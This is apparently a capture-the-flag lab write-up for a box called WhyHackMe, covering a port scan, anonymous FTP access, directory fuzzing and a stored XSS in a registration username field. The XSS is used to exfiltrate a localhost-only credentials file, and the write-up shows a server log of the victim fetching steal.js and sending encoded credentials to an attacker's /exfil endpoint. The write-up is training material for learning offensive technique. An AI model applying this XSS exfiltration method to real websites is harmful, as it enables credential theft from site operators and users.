# WhyHackMe

## Port scan

```bash
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.9.227.162
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)

<<SNIPPED>>

80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```



## Ftp files

* Since anonymous login was enabled we can go ahead  and grab the file

```bash
└─➜ ftp 10.10.59.115                                                                                                                                                                     [0]
Connected to 10.10.59.115.
220 (vsFTPd 3.0.3)
Name (10.10.59.115:heap): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Mar 14  2023 .
drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
g226 Directory send OK.
ftp> get update.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for update.txt (318 bytes).
226 Transfer complete.
318 bytes received in 7.1e-05 seconds (4.27 Mbytes/s)
ftp> quit
221 Goodbye.

```



### File (update.txt)

```bash
└─➜ cat update.txt    ]
Hey I just removed the old user mike because that account was 
compromised and for any of you who wants the creds of new account 
visit 127.0.0.1/dir/pass.txt and don't worry this file is 
only accessible by localhost(127.0.0.1), 
so nobody else can view it except me or people with access to the common account.
- admin
```

After reading that we can clearly see a hint of SSRF.&#x20;



## Web page

After you read the blog, you can see it wants you to login first to comment down on the blog.

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

## Dir scan

```bash
[Status: 200, Size: 643, Words: 36, Lines: 23, Duration: 147ms]
    * FUZZ: register.php
```

Found a register portal.



## Web exploitation

After registering myself with `test:test` i tried exploiting XSS, CMD injection, SQLi but none worked, maybe username parameter is vulnerable.

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

After login, i can now comment on blog

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Yessss, the username parameter was actually vulnerable to XSS.

* Registering new user with XSS payload that will give us admin cookie.

We need to steal contents of a file from a server with XSS, upon google searching we can go on following link

{% embed url="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#steal-page-content" %}

Using that we get creds,

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.17.41.43 - - [21/Mar/2024 09:52:51] "GET /steal.js HTTP/1.1" 200 -
10.17.41.43 - - [21/Mar/2024 09:52:51] "GET /steal.js HTTP/1.1" 200 -
10.17.41.43 - - [21/Mar/2024 09:52:51] code 404, message File not found
10.17.41.43 - - [21/Mar/2024 09:52:51] "GET /exfil? HTTP/1.1" 404 -
10.10.234.35 - - [21/Mar/2024 09:53:03] "GET /steal.js HTTP/1.1" 200 -
10.10.234.35 - - [21/Mar/2024 09:53:03] code 404, message File not found
10.10.234.35 - - [21/Mar/2024 09:53:03] "GET /exfil?amFjazpXaHl <snip> Z0lESwo= HTTP/1.1" 404 -

```





